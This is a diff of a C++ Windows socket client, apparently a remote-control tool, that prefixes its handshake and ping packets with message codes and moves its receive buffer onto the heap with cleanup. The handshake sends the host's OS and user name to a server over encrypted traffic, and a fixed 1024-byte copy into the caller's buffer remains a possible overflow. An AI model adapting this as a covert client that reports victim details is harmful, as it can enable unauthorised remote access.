@@ -99,14 +99,15 @@ void Cliente::ProcesarComando(std::vector<std::string> strIn) {
         std::cout << "Ping\n";
 #endif
         //implementar un metodo para devolverle el pong con el numero de parametro
-        int iB = this->cSend(this->sckSocket, "PONG", 4, 0, false);
+        int iB = this->cSend(this->sckSocket, "02\\P", 4, 0, false);
     }
 }
 
 
 void Cliente::iniPacket() {
     //Enviar SO
-    std::string strOut = strOS();
+    std::string strOut = "01\\";
+    strOut += strOS();
     strOut.append(1, '\\');
     strOut += strUserName();
     strOut.append(1, '\\');
@@ -158,8 +159,8 @@ int Cliente::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool is
     //Aqui el socket por defecto es block asi que si se pasa false es normal
     // 1 non block
     // 0 block
-    char cTmpBuff[1024];
-    memset(&cTmpBuff, 0, 1024);
+    char* cTmpBuff = new char[pLen];
+    ZeroMemory(cTmpBuff, pLen);
 
     int iRecibido = 0;
     if (isBlock) {
@@ -173,7 +174,10 @@ int Cliente::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool is
         iRecibido = recv(pSocket, cTmpBuff, pLen, pFlags);
         std::cout << "Recibidos " << iRecibido << " bytes\n";
         if (iRecibido <= 0) {
-            error_2("recv");
+            if (cTmpBuff) {
+                ZeroMemory(cTmpBuff, pLen);
+                delete[] cTmpBuff;
+            }
             return -1;
         }
         //Decrypt
@@ -195,7 +199,10 @@ int Cliente::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool is
             error();
 #endif
         }
-
+        if (cTmpBuff) {
+            ZeroMemory(cTmpBuff, pLen);
+            delete[] cTmpBuff;
+        }
         return iRecibido;
     }
     else {
@@ -203,7 +210,10 @@ int Cliente::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool is
         iRecibido = recv(pSocket, cTmpBuff, pLen, pFlags);
         std::cout << "Recibidos " << iRecibido << " bytes\n";
         if (iRecibido <= 0) {
-            error_2("recv");
+            if (cTmpBuff) {
+                ZeroMemory(cTmpBuff, pLen);
+                delete[] cTmpBuff;
+            }
             return -1;
         }
         ByteArray bOut = this->bDec((const unsigned char*)cTmpBuff, iRecibido);
@@ -216,6 +226,10 @@ int Cliente::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool is
         }
         memccpy(pBuffer, strOut.c_str(), '\0', 1024);
 
+        if (cTmpBuff) {
+            ZeroMemory(cTmpBuff, pLen);
+            delete[] cTmpBuff;
+        }
         return iRecibido;
     }
 }
